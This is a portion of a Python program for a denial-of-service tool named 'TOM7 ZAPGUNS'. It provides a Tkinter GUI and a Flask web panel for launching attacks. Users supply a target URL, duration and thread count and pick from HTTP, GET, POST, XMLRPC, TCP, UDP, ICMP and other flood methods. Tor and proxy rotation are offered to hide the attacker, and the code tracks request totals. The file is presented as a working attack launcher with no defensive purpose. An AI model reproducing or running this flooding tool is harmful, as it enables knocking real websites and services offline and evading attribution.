        self.root.configure(bg="#00aeff")
        windowx = 800
        windowy = 600
        screenx = root.winfo_screenwidth()
        screeny = root.winfo_screenheight()
        centery = int(screeny/2 - windowy/2)
        centerx = int(screenx/2 - windowx/2)
        self.root.geometry(f"{windowx}x{windowy}+{centerx}+{centery}")

        mainframex = tk.Frame(
            root,
            bg="#000000"
        )

        mainframex.pack(
            expand=True,
            fill="both",
            padx=10,
            pady=10
        )

        self.targetvarx = tk.StringVar()
        self.durationxvar = tk.StringVar(value="")
        self.threadsxvar = tk.StringVar(value="")
        self.methodxvar = tk.StringVar(value="")
        self.tornetvar = tk.BooleanVar()

        mainfontx = tkfont.Font(
            family="Helvetica",
            size=14,
            weight="bold",
            slant="italic"
        )
        
        mainlabelfontx = tkfont.Font(
            family="Helvetica",
            size=10
        )

        tk.Label(
            mainframex,
            bg="#000000",
            fg="#00FFBB",
            font=mainfontx,
            text="TOM7 ARMED V2 | TOM7 ZAPGUNS",
            highlightthickness=2,
            highlightbackground="#00FFBB",
            highlightcolor="#00FFBB"
        ).pack(
            side="top",
            padx=10,
            pady=10,
            ipadx=10,
            ipady=10
        )

        inputfieldx = [
            ("Target URL:", self.targetvarx),
            ("Duration (s):", self.durationxvar),
            ("Threads:", self.threadsxvar)
        ]

        for text, var in inputfieldx:
            frame = tk.Frame(
                mainframex,
                bg="#000000",
                relief="flat",
                highlightthickness=1,
                highlightbackground="#00FFBB",
                highlightcolor="#00FFBB"
            )

            frame.pack(
                fill="x",
                padx=10,
                pady=10
            )

            tk.Label(
                frame,
                text=text,
                bg="#000000",
                fg="#00FF6E",
                font=mainlabelfontx,
                anchor="w",
                padx=10,
                pady=10
            ).pack(
                side="left",
                ipadx=5,
                ipady=5
            )
            
            tk.Entry(
                frame,
                textvariable=var,
                width=40,
                bg="#01002a",
                fg="#00FFBB",
                insertbackground="#00e0f9",
                relief="flat",
                highlightthickness=1,
                highlightbackground="#00FFBB",
                highlightcolor="#00FFBB",
                font=("Helvetica", 10),
                justify="left"
            ).pack(
                side="right",
                padx=10,
                pady=10,
                ipadx=5,
                ipady=5
            )

        methodframex = tk.Frame(
            mainframex,
            bg="#000000",
            relief="flat",
            highlightthickness=1,
            highlightbackground="#00FFBB",
            highlightcolor="#00FFBB"
        )

        methodframex.pack(
            fill="x",
            padx=10,
            pady=10
        )

        tk.Label(
            methodframex,
            bg="#000000",
            fg="#00FFBB",
            justify="left",
            text="Methods:"
        ).pack(
            side="left",
            padx=10,
            pady=10
        )
        
        ttk.Combobox(
            methodframex,
            background="#000000",
            foreground="#00FFEE",
            font=mainlabelfontx,
            textvariable=self.methodxvar,
            values=["HTTP Flood", "GET Flood", "POST Flood", "JSON Flood", "HEAD Flood", "PUT Flood", "DELETE Flood", "XMLRPC Flood", "TCP Flood", "UDP Flood", "ICMP Flood"],
            width=35,
            justify="left"
        ).pack(
            side="right",
            padx=10,
            pady=10,
            ipadx=5,
            ipady=5
        )

        tk.Checkbutton(
            mainframex,
            bg="#000000",
            fg="#8000ff",
            activebackground="#4e0082",
            activeforeground="#000000",
            relief="flat",
            highlightthickness=1,
            highlightbackground="#8000ff",
            highlightcolor="#8000ff",
            selectcolor="#00FFD9",
            font=mainlabelfontx,
            variable=self.tornetvar,
            text="TOR PROXIES"
        ).pack(
            padx=10,
            pady=10
        )

        self.attackbtnx = tk.Button(
            mainframex,
            bg="#000000",
            fg="#00FBFF",
            font=mainlabelfontx,
            command=self.xstartattack,
            text="Launch Attack",
            activebackground="#00FFD0",
            activeforeground="#000000",
            relief="groove",
            highlightthickness=1,
            highlightbackground="#0084ff",
            highlightcolor="#8000ff",
            width=25,
            justify="center"
        )

        self.attackbtnx.pack(
            padx=10,
            pady=10,
            ipadx=5,
            ipady=5
        )
        
        self.attackbtnx.bind(
            "<Enter>",
            lambda e: self.attackbtnx.configure(
                text="LAUNCH ATTACK"
            )
        )

        self.attackbtnx.bind(
            "<Leave>",
            lambda e: self.attackbtnx.configure(
                text="IDLE"
            )
        )

        self.statuslblx = tk.Label(
            mainframex,
            bg="#000000",
            fg="#E100FF", 
            font=mainlabelfontx,
            justify="left",
            text="ATTACK STATS"
        )

        self.statuslblx.pack(
            side="left",
            fill="x",
            padx=5,
            pady=5,
            ipadx=10,
            ipady=10
        )

        self.xmonupdate()

    def xstartattack(self):
        target = self.targetvarx.get()
        try:
            duration = int(self.durationxvar.get())
            threads = int(self.threadsxvar.get())
        except ValueError:
            messagebox.showerror("ERROR !", "Threads & Duration Must Be Valid Numbers.")
            return

        method = self.methodxvar.get()
        tornet = self.tornetvar.get()
        proxy = None

        if not tornet and xproxy:
            proxy = random.choice(xproxy)

        if not target.startswith("http"):
            messagebox.showerror(f"ERROR !", "Invalid URL! Must Be Start With http:// or https://")
            return
        
        if xstatus.startx:
            print(f"WARNING", "An Attack Already Running. Wait For It To Finish.")
            return

        with lockx:
            xstatus.monitorx = False
            xstatus.startx = True
            xstatus.rps = 0
            xstatus.targetx = target
            xstatus.methodx = method
        sleep(0.1)

        xattackthreads = threading.Thread(
            target=self.xstartzapgunsattack,
            args=(target, duration, threads, method, proxy, tornet),
            daemon=True
        )
        
        xattackthreads.start()

    def xmonupdate(self):
        try:
            with lockx:
                xcurrent = xstatus.rps
            
            target = xstatus.targetx if xstatus.targetx else self.targetvarx.get()
            method = xstatus.methodx if xstatus.methodx else self.methodxvar.get()
            parsed = urlparse(target)
            host = parsed.hostname
            port = 443 if parsed.scheme == "https" else 80

            xstatusboard = f"Target: {host if host else 'N/A'}\nMethod: {method if method else 'N/A'}\nPort: {port if port else 'N/A'}\nTotal Requests: {xcurrent}"
            self.statuslblx.config(text=xstatusboard)
        except Exception as e:
            logging.debug(f"TOM7 ZAPGUNS GUI ERROR: {e}")

        self.root.after(100, self.xmonupdate)


    def xstartzapgunsattack(self, target, duration, threads, method, proxy, tornet):
        if not tornet and xproxy:
            proxy = random.choice(xproxy)
        if tornet:
            xtorsocket = xtor(target)
            if not xtorsocket:
                logging.warning("TOR Connection Failed, Proceeding Without TOR")

        try:
            if method == "HTTP Flood":
                AttackMethods.xhttpflood(target, duration, threads, proxy, tornet)
            elif method == "GET Flood":
                AttackMethods.xgetflood(target, duration, threads, proxy, tornet)
            elif method == "POST Flood":
                AttackMethods.xpostflood(target, duration, threads, proxy, tornet)
            elif method == "JSON Flood":
                AttackMethods.xjsonflood(target, duration, threads, proxy, tornet)
            elif method == "HEAD Flood":
                AttackMethods.xheadflood(target, duration, threads, proxy, tornet)
            elif method == "PUT Flood":
                AttackMethods.xputflood(target, duration, threads, proxy, tornet)
            elif method == "DELETE Flood":
                AttackMethods.xdeleteflood(target, duration, threads, proxy, tornet)
            elif method == "XMLRPC Flood":
                AttackMethods.xxmlrpcflood(target, duration, threads, proxy, tornet)
            elif method == "TCP Flood":
                AttackMethods.xtcpflood(target, duration, threads)
            elif method == "UDP Flood":
                AttackMethods.xudpflood(target, duration, threads)
            elif method == "ICMP Flood":
                AttackMethods.xicmpflood(target, duration, threads)
            else:
                logging.info(f"{Back.RED} {Fore.BLACK} Unknown Attack Vector: {Fore.CYAN} {method} {Fore.RESET} {Back.RESET}")
        except Exception as e:
            logging.error(f"{Back.RED} {Fore.BLACK} Unknown Fatal Error: {Fore.CYAN} {e} {Fore.RESET} {Back.RESET}")
        finally:
            with lockx:
                xstatus.monitorx = True
                xstatus.startx = False
                sleep(0.1)

            finalattackx = xstatus.rps
            xtargetx = xstatus.targetx
            xmethodx = xstatus.methodx
            self.root.after(0, lambda: messagebox.showinfo(
                "ATTACK STATS",
                f"Attack On Target {xtargetx} Finished.\nMethods: {xmethodx}\nTotal Attack: {finalattackx}"
            ))

# WEB ATTACK CONTROLS PANEL CONFIGURATIONS

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_FOLDER = os.path.join(BASE_DIR, 'TM7CONFIG')
app = Flask(__name__, template_folder=TEMPLATES_FOLDER)
app.secret_key = "26999"

@app.route("/")
def home():
    return RTEMXP("TOM7ARMEDZAPGUNS.html")

@app.route('/<path:filename>')
def serve_tom7_files(filename):
    return FSDIRX(TEMPLATES_FOLDER, filename)

@app.route("/attack-status", methods=["GET"])
def get_attack_status():
    global xstatus, consolemsgx
    with lockx:
        statusdatax = {
            "active": xstatus.startx,
            "requests": xstatus.rps,
            "target": xstatus.targetx,
            "method": xstatus.methodx,
            "consolemsgx": consolemsgx[-10:] if consolemsgx else []
        }
    return jsonify(statusdatax)

@app.route("/get-target-ip", methods=["POST"])
def xgipaddr():
    try:
        target = request.json.get("target")
        parsed = urlparse(target)
        host = parsed.hostname
        ip = socket.gethostbyname(host)
        return jsonify({"success": True, "ip": ip, "host": host})
    except socket.gaierror:
        return jsonify({"success": False, "error": "DNS Resolution Failed"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/attack", methods=["POST"])
def xattackweb():
    global consolemsgx
    consolemsgx.clear()

    if xstatus.startx:
        return RTEMXP(
            "Attack.html",
            target=session.get('target', 'N/A'),
            duration=session.get('duration', 0),
            threads=session.get('threads', 0),
            method=session.get('method', 'N/A'),
            tor=session.get('tor', 'No'),
            xcurrent=xstatus.rps
        ), 200


    target = request.form.get("target", "").strip()

    try:
        duration = int(request.form.get("duration"))
    except (ValueError, TypeError):
        return jsonify({"error": "Duration Must Be A Number"}), 400

    try:
        threads = int(request.form.get("threads"))
    except (ValueError, TypeError):
        return jsonify({"error": "Threads Must Be A Number"}), 400

    method = request.form.get("method")
    if not method:
        return jsonify({"error": "Method Is Required"}), 400

    tornet = True if "tor" in request.form else False

    if not target.startswith(("http://", "https://")):
        return jsonify({"error": "Invalid URL Format"}), 400

    try:
        parsed = urlparse(target)
        host = parsed.hostname
        ipaddr = socket.gethostbyname(host)
    except Exception as e:
        ipaddr = "Unknown"

    proxy = None

    with lockx:
        xstatus.startx = True
        xstatus.targetx = target
        xstatus.methodx = method
        xstatus.rps = 0
        xcurrent = 0

    session['target'] = target
    session['duration'] = duration
    session['threads'] = threads
    session['method'] = method
    session['tor'] = 'Yes' if tornet else 'No'
    session['xcurrent'] = xcurrent
    session['ip'] = ipaddr

    consolepanelmsg("Attack initialized")
    consolepanelmsg(f"Target: {target}")
    consolepanelmsg(f"Method: {method}")
    consolepanelmsg(f"Threads: {threads}")
    consolepanelmsg(f"Duration: {duration}s")
    consolepanelmsg(f"TOR: {'Enabled' if tornet else 'Disabled'}")

    if not tornet and xproxy:
        proxy = random.choice(xproxy)

    if tornet:
        xtor(target)
        consolepanelmsg("TOR Proxies Activated")

    def xfattack():
        try:
            consolepanelmsg("⚡ Attack Launched!")

            if method == "HTTP Flood":
                AttackMethods.xhttpflood(target, duration, threads, proxy, tornet)
            elif method == "GET Flood":
                AttackMethods.xgetflood(target, duration, threads, proxy, tornet)
            elif method == "POST Flood":
                AttackMethods.xpostflood(target, duration, threads, proxy, tornet)
            elif method == "JSON Flood":
                AttackMethods.xjsonflood(target, duration, threads, proxy, tornet)
            elif method == "HEAD Flood":
                AttackMethods.xheadflood(target, duration, threads, proxy, tornet)
            elif method == "PUT Flood":
                AttackMethods.xputflood(target, duration, threads, proxy, tornet)
            elif method == "DELETE Flood":
                AttackMethods.xdeleteflood(target, duration, threads, proxy, tornet)
            elif method == "XMLRPC Flood":
                AttackMethods.xxmlrpcflood(target, duration, threads, proxy, tornet)
            elif method == "TCP Flood":
                AttackMethods.xtcpflood(target, duration, threads)
            elif method == "UDP Flood":
                AttackMethods.xudpflood(target, duration, threads)
            elif method == "ICMP Flood":
                AttackMethods.xicmpflood(target, duration, threads)

            consolepanelmsg("Attack Completed Successfully")

        except Exception as e:
            consolepanelmsg(f"Error: {str(e)}")
            logging.error(f"Attack Error: {e}")
        finally:
            sleep(1)
            with lockx:
                xstatus.startx = False

    xwebthreads = threading.Thread(target=xfattack, daemon=True)
    xwebthreads.start()

    return RTEMXP(
        "Attack.html",
        target=target,
        duration=duration,
        threads=threads,
        method=method,
        tor=("Yes" if tornet else "No"),
        xcurrent=xcurrent
    ), 200

@app.route("/stop-attack", methods=["POST"])
def stop_attack():
    global xstatus
    with lockx:
        if xstatus.startx:
            xstatus.startx = False
            finalxcurrent = xstatus.rps
            consolepanelmsg(f"Attack Stopped Manually At {finalxcurrent} Requests")
            return jsonify({"success": True, "message": "Attack Stopped", "finalxcurrent": finalxcurrent})
        else:
            return jsonify({"success": False, "message": "No Active Attack"})

@app.route("/attack-summary", methods=["GET"])
def attack_summary():
    with lockx:
        return jsonify({
            "total_requests": xstatus.rps,
            "target": xstatus.targetx,
            "method": xstatus.methodx,
            "active": xstatus.startx
        })


# MAIN ROOT CONFIGURATIONS

if __name__ == "__main__":
    cleargui()
    dinamicsgui(f"Loading User Agents")
    dinamicsgui(f"Loading Proxies")
    dinamicsgui(f"Loading Referers")
    sleep(1)
    cleargui()
    print(f"{Fore.RED}{XBANNER}{Fore.RESET}")
    FILE_LOADED = f"""
        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} USER AGENTS: {Fore.CYAN} {len(xuseragent)} {Back.RESET}

        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} PROXIES: {Fore.CYAN} {len(xproxy)} {Back.RESET}

        {Back.BLACK}{Fore.YELLOW}[{Fore.RED} S {Fore.YELLOW}] {Fore.GREEN} REFERERS: {Fore.CYAN} {len(xreferer)} {Back.RESET}
    """
    print(f"{FILE_LOADED}")

    print(f"\n{Fore.CYAN}{'>'*60}{Fore.RESET}")
    print(f"{Fore.GREEN}[>] Web Interface: {Fore.YELLOW}http://localhost:5000{Fore.RESET}")
    print(f"{Fore.GREEN}[>] API Endpoint: {Fore.YELLOW}http://localhost:5000/attack-status{Fore.RESET}")
    print(f"{Fore.GREEN}[>] GUI Window: {Fore.YELLOW}Opening...{Fore.RESET}")
    print(f"{Fore.CYAN}{'>'*60}{Fore.RESET}\n")

    tfx = threading.Thread(
        target=lambda: app.run(
            host="0.0.0.0",
            port=5000, 
            debug=False,
            use_reloader=False),
            daemon=True
        )
    
    tfx.start()

    root = tk.Tk()
    gui = TOM7ARMEDGUI(root)

    try:
        root.mainloop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Keyboard Interrupt Detected{Fore.RESET}")
    finally:
        with lockx:
            xstatus.monitorx = True
            xstatus.startx = False

        print(f"\n{Fore.LIGHTCYAN_EX}[*] Shutting Down...{Fore.RESET}")
        sleep(1)
        print(f"\n{Fore.CYAN}{':>'*60}{Fore.RESET}")
        print(f"{Fore.RED}{XBANNER}{Fore.RESET}")
        print(f"{Fore.GREEN}[✓] Program Exited Successfully{Fore.RESET}")
        print(f"\n{Fore.CYAN}{'<:'*60}{Fore.RESET}")

